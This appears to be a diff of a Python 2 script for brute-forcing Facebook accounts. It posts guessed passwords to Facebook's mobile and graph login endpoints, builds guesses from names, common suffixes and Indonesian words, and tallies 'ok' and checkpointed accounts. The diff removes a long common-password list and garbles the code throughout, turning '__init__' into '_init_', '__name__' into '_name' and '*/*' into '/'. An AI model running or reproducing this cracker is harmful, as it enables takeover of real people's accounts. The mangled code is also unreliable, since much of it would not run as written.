@@ -1,4 +1,4 @@
-#-*-coding:utf-8-*-
+#--coding:utf-8--
 
 #Create & Recode By Xami King & Sarkar
 #Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Kami.
@@ -45,12 +45,12 @@ else:
         R = ''
 def banner():
 	print("""
-\033[0;93m    ______           _ _ 
+\033[0;93m    __           _ _ 
 \033[0;93m   |  _  \         (_) | \033[0;93m║ \033[0;94mCoded By \033[0;93mXami \033[0;94m& \033[0;93mSarkar
-\033[0;93m  | | | |_____   ___| | \ \033[0;93m║ \033[0;94mFB \033[0;93m: \033[0;94mFacebook.com/100055457601047
+\033[0;93m  | | | |__   __| | \ \033[0;93m║ \033[0;94mFB \033[0;93m: \033[0;94mFacebook.com/100055457601047
 \033[0;93m | | | / _ \ \ / / | | \033[0;93m║ \033[0;94mFB \033[0;93m: \033[0;94mFacebook.com/sonu.prince.182
 \033[0;93m| |/ /  __/\ V /| | | \033[0;93m║ \033[0;94mGithub \033[0;93m: \033[0;94mGithub.com/TERmuxkiler
-\033[0;93m|___/ \___| \_/ |_|_| \033[0;93m║ \033[0;94mWhatsapp \033[0;93m: \033[0;97mWhatsapp +18032743526
+\033[0;93m|_/ \__| \/ ||| \033[0;93m║ \033[0;94mWhatsapp \033[0;93m: \033[0;97mWhatsapp +18032743526
 \033[0;93m─────────────────────────────────────────────────────────────""")
 
 host="https://mbasic.facebook.com"
@@ -65,13 +65,13 @@ uas=None
 if os.path.exists(".browser"):
 	if os.path.getsize(".browser") !=0:
 		uas=open(".browser").read().strip()
-touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 def clear():
 	if " linux" in sys.platform.lower():
 		os.system("clear")
@@ -100,7 +100,7 @@ def basecookie():
 def hdcok():
 	global host,ua
 	hosts=host
-	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
+	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
 	return r
 def gets_cookies(cookies):
 	result=[]
@@ -158,7 +158,7 @@ def convert():
 		'upgrade-insecure-requests' : '1',
 		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 		'cache-control'             : 'max-age=0',
-		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
 		'content-type'              : 'text/html; charset=utf-8'
 		}, cookies = {
 		'cookie'                    : open(".cok",'r').read()
@@ -300,7 +300,7 @@ def mbasic(em,pas,hosts):
 			data.update({i.get("name"):i.get("value")})
 	data.update(
 		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		"_req":"d","csr":"","a":"","_dyn":"","encpass":""
 		}
 	)
 	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
@@ -330,7 +330,7 @@ def m_fb(em,pas,hosts):
 			data.update({i.get("name"):i.get("value")})
 	data.update(
 		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		"_req":"d","csr":"","a":"","_dyn":"","encpass":""
 		}
 	)
 	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
@@ -360,7 +360,7 @@ def touch_fb(em,pas,hosts):
 			data.update({i.get("name"):i.get("value")})
 	data.update(
 		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		"_req":"d","csr":"","a":"","_dyn":"","encpass":""
 		}
 	)
 	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
@@ -390,7 +390,7 @@ def graph_fb(em,pas,hosts):
 			data.update({i.get("name"):i.get("value")})
 	data.update(
 		{"fb_dtsg":meta,"m_sess":"","__user":"0",
-		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+		"_req":"d","csr":"","a":"","_dyn":"","encpass":""
 		}
 	)
 	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
@@ -415,69 +415,13 @@ def generate(text):
 				results.append(i+"123")
 				results.append(i+"1234")
 				results.append(i+"12345")
-				result.append(i+"786")
-				result.append(i+"000")
-				result.append(i+"111")
-				result.append(i+"143")
-				result.append(i+"1122")
 				results.append(i)
 				if "indonesia" in ips:
 					results.append("sayang")
 					results.append("bismillah")
 					results.append("anjing")
                                         results.append("123456")
-                                        results.append("786786")
-                                        result.append("000786")
-                                        result.append("786000")
-                                        result.append ("223344")
-result.append("102030")
-result.append("998877")      
-result.append("123456789")
-result.append("111111")
-result.append("qwerty")
-result.append("12345678")
-result.append("1234567890")
-result.append("1234567")
-result.append("password")
-result.append("123123")
-result.append("987654321")
-result.append("qwertyuiop")
-result.append("mynoob")
-result.append("123321")
-result.append("666666")
-result.append("18atcskd2w")
-result.append("777777")
-result.append("1q2w3e4r")
-result.append("654321")
-result.append("555555")
-redult.append("google")
-result.append("123qwe")
-result.append("1q2w3e")
-result.append("abc123")
-result.append("password1")
-result.append("iloveyou")
-result.append("000000")
-result.append ("qwerty123")
-result.append ("zaq12wsx")
-result.append("dragon")
-result.append("sunshine")
-result.append("princess")
-result.append("letmein")
-result.append("monkey")
-result.append("276543")
-result.append("1qaz2wsx")
-result.append("superman")
-result.append("asdfghjkl")
-result.append("hallo123")
-result.append("passwort")
-result.append("sommer")
-result.append("dennis")
-result.append("killer")
-result.append("lol123")
-result.append("010203")
-result.append("chocolate")
-result.append("football")
-return results
+	return results
 def methode():
   os.system("clear")
   banner()
@@ -524,7 +468,7 @@ def logs():
 class crack:
         os.system("clear")
         banner()
-	def __init__(self):
+	def _init_(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
@@ -625,7 +569,7 @@ class crack:
 class crack1:
         os.system("clear")
         banner()
-	def __init__(self):
+	def _init_(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
@@ -726,7 +670,7 @@ class crack1:
 class crack2:
         os.system("clear")
         banner()
-	def __init__(self):
+	def _init_(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
@@ -827,7 +771,7 @@ class crack2:
 class crack2:
         os.system("clear")
         banner()
-	def __init__(self):
+	def _init_(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
@@ -928,7 +872,7 @@ class crack2:
 class crack3:
         os.system("clear")
         banner()
-	def __init__(self):
+	def _init_(self):
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
@@ -1026,5 +970,5 @@ class crack3:
 			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
-if __name__=='__main__':
+if _name=='main_':
   menu()
